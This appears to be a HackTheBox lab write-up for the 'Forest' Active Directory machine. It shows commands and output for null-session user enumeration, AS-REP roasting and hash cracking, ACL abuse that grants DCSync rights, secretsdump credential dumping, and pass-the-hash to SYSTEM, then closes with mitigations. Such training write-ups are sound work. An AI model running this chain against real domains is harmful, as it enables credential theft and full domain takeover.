---
title: "Forest — HackTheBox"
date: 2026-05-30
platform: "HackTheBox"
difficulty: "Medium"
category: "Active Directory"
tags: ["as-rep-roasting", "bloodhound", "dcsync", "acl-abuse", "windows"]
published: true
excerpt: "Forest goes from an anonymous LDAP session to Domain Admin via AS-REP roasting and an ACL-abuse chain that ends in DCSync. A perfect walkthrough of why Active Directory attack paths are about permissions, not just passwords."
---

# Forest — HackTheBox

**IP:** 10.10.10.161
**OS:** Windows Server 2016 (Domain: `htb.local`)
**Difficulty:** Medium

---

## Why This Box Matters

Forest is the canonical "AD is a graph" box. The password (`s3rvice`) is almost incidental — the real lesson is the **ACL-abuse chain** that turns a low-privilege user into DCSync rights over the domain.

---

## Reconnaissance

```bash
nmap -sC -sV -p- 10.10.10.161

88/tcp    open  kerberos-sec
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: htb.local)
445/tcp   open  microsoft-ds
5985/tcp  open  wsman         (WinRM)
```

## Anonymous User Enumeration

RPC allows a null session, so we can pull the user list:

```bash
rpcclient -U "" -N 10.10.10.161 -c "enumdomusers"

user:[Administrator]
user:[svc-alfresco]
user:[sebastien] ...
```

## AS-REP Roasting

`svc-alfresco` has **"Do not require Kerberos pre-authentication"** set — that means the DC will hand out an AS-REP encrypted with the account's hash to *anyone* who asks, no password needed:

```bash
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -no-pass

$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

Crack it offline:

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
s3rvice
```

## Foothold via WinRM

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
*Evil-WinRM* PS C:\> whoami
htb\svc-alfresco
```

## Mapping the Path with BloodHound

Collect and analyze:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c All
```

BloodHound reveals the chain:

```
svc-alfresco → (member of) Service Accounts → Privileged IT Accounts → Account Operators
Account Operators → (GenericAll) Exchange Windows Permissions
Exchange Windows Permissions → (WriteDacl) htb.local (domain object)
```

`WriteDacl` on the domain means we can grant ourselves **DCSync**.

## ACL Abuse → DCSync

```powershell
# Create a controlled user and add it to Exchange Windows Permissions
net user pwned P@ssw0rd123! /add /domain
net group "Exchange Windows Permissions" pwned /add

# Abuse WriteDacl to grant DCSync (Replication) rights
$pass = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\pwned',$pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "htb.local" `
  -PrincipalIdentity pwned -Rights DCSync
```

## DCSync → Domain Admin

```bash
secretsdump.py htb.local/pwned:'P@ssw0rd123!'@10.10.10.161

Administrator:500:aad3b...:32693b11e6aa90eb43d32c72a07ceea6:::
```

Pass-the-hash straight to SYSTEM:

```bash
psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local/Administrator@10.10.10.161
C:\> whoami
nt authority\system
```

---

## Root Cause & Mitigation

- **AS-REP roasting:** never set "do not require pre-auth"; if you must, give that account a long random password.
- **ACL abuse:** audit nested group membership and dangerous rights (`WriteDacl`, `GenericAll`) with BloodHound *before* an attacker does. Account Operators is far more powerful than it looks.
- **DCSync:** monitor for replication requests (`DRSUAPI`) from non-DC principals — that's the highest-fidelity DCSync alert you can build.
